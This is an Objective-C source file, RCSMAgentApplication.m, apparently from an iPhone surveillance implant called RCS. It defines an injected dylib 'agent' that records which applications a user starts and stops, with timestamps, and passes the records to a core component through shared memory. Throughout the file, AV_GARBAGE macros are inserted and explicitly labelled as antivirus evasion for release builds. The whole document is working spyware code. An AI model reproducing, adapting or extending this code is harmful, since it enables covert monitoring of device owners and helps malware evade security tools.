//
//  RCSMAgentApplication.m
//  RCSIphone
//
//  Created by kiodo on 12/3/10.
//  Copyright 2010 __MyCompanyName__. All rights reserved.
//

#import "RCSMCommon.h"

#import "RCSMAgentApplication.h"
#import "RCSMSharedMemory.h"

#import "RCSMAVGarbage.h"

#define TM_SIZE (sizeof(struct tm) - sizeof(long) - sizeof(char*))
#define PROC_START @"START"
#define PROC_STOP  @"STOP"
#define LOG_DELIMITER 0xABADC0DE

//#define DEBUG

static __m_MAgentApplication *sharedAgentApplication = nil;
extern __m_MSharedMemory     *mSharedMemoryLogging;


@implementation __m_MAgentApplication

@synthesize isAppStarted;

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (__m_MAgentApplication *)sharedInstance
{
  @synchronized(self)
  {
  if (sharedAgentApplication == nil)
    {
      //
      // Assignment is not done here
      [[self alloc] init];
    }
  }
  
  return sharedAgentApplication;
}

- (id)init
{
  self = [super init];
  
  if (self != nil)
    isAppStarted = NO;
  
  return self;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
  if (sharedAgentApplication == nil)
    {
      sharedAgentApplication = [super allocWithZone: aZone];
      
      // Assignment and return on first allocation
      return sharedAgentApplication;
    }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (id)retain
{
  return self;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

- (BOOL)grabInfo: (NSString*)aStatus
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSBundle *bundle = [NSBundle mainBundle];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSDictionary *info = [bundle infoDictionary];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  mProcessName = (NSString*)[[info objectForKey: (NSString*)kCFBundleExecutableKey] copy];
  mProcessDesc = @"";
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
#ifdef DEBUG
  if (mProcessName != nil) 
    NSLog(@"[DYLIB] %s: application agent info %@", __FUNCTION__, mProcessName);
#endif
  
  [self writeProcessInfoWithStatus: aStatus];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  [pool release];
  
  return YES;
}


- (BOOL)writeProcessInfoWithStatus: (NSString*)aStatus
{
  struct timeval tp;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  NSData *processName       = [mProcessName dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSData *pStatus           = [aStatus dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  NSMutableData *logData    = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  NSMutableData *entryData  = [[NSMutableData alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
  short unicodeNullTerminator = 0x0000;
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  time_t rawtime;
  struct tm *tmTemp;
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  // Struct tm
  time (&rawtime);
  tmTemp            = gmtime(&rawtime);
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  tmTemp->tm_year   += 1900;
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  tmTemp->tm_mon    ++;
  //
  // Our struct is 0x8 bytes bigger than the one declared on win32
  // this is just a quick fix
  // 0x14 bytes for 64bit processes
  //
  if (sizeof(long) == 4) // 32bit
  {
    // AV evasion: only on release build
    AV_GARBAGE_008
    
    [entryData appendBytes: (const void *)tmTemp
                    length: sizeof (struct tm) - 0x8];
  }
  else if (sizeof(long) == 8) // 64bit
  {   
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    [entryData appendBytes: (const void *)tmTemp
                    length: sizeof (struct tm) - 0x14];
  }
  
//  //
//  // Our struct is 0x8 bytes bigger than the one declared on win32
//  // this is just a quick fix
//  //
//  [entryData appendBytes: (const void *)tmTemp
//                  length: 36];//sizeof (struct tm) - TM_SIZE];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  // Process Name
  [entryData appendData: processName];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  // Null terminator
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  // Status of process
  [entryData appendData: pStatus];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  // Null terminator
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  // No process desc: Null terminator
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  // Delimiter
  unsigned int del = LOG_DELIMITER;
  [entryData appendBytes: &del
                  length: sizeof(del)];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  gettimeofday(&tp, NULL);
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  // Log buffer
  shMemoryHeader->status          = SHMEM_WRITTEN;
//  shMemoryHeader->logID           = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  shMemoryHeader->agentID         = AGENT_APPLICATION;
  shMemoryHeader->direction       = D_TO_CORE;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->flag            = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  shMemoryHeader->commandDataSize = [entryData length];
  shMemoryHeader->timestamp       = (tp.tv_sec << 20) | tp.tv_usec;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if ([mSharedMemoryLogging writeMemory: logData 
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG
      NSLog(@"[DYLIB] %s: Application sent through SHM", __FUNCTION__);
#endif
    }
  else
    {
#ifdef DEBUG
      NSLog(@"[DYLIB] %s: Error while logging Application to shared memory", __FUNCTION__);
#endif
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  [logData release];
  [entryData release];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  return YES;
}

- (void)sendStopLog
{
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if (isAppStarted == YES)
    [self grabInfo: PROC_STOP];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
}

- (void)sendStartLog
{
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (isAppStarted == YES) 
    [self grabInfo: PROC_START];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
}

- (void)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  // Ok application is running
  [self grabInfo: PROC_START];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  // wait for termination and write down the log      
  [[NSNotificationCenter defaultCenter] addObserver: self
                                           selector: @selector(sendStopLog)
                                               name: NSApplicationWillTerminateNotification
                                             object: nil];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  sleep(1);
  
  isAppStarted = YES;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [outerPool release];
}

- (BOOL)resume
{
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  return YES;
}

- (BOOL)stop
{
  // stop writing down STOP log
  [[NSNotificationCenter defaultCenter] removeObserver:self];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
    
  [mAgentConfiguration setObject: AGENT_STOP forKey: @"status"];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  isAppStarted = NO;
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  return YES;
}


#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (aConfiguration != mAgentConfiguration)
    {
      // AV evasion: only on release build
      AV_GARBAGE_001
    
      [mAgentConfiguration release];
    
      // AV evasion: only on release build
      AV_GARBAGE_002
    
      mAgentConfiguration = [aConfiguration retain];
      
      // AV evasion: only on release build
      AV_GARBAGE_005
    }
}

- (NSMutableDictionary *)mAgentConfiguration
{
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  return mAgentConfiguration;
}

@end
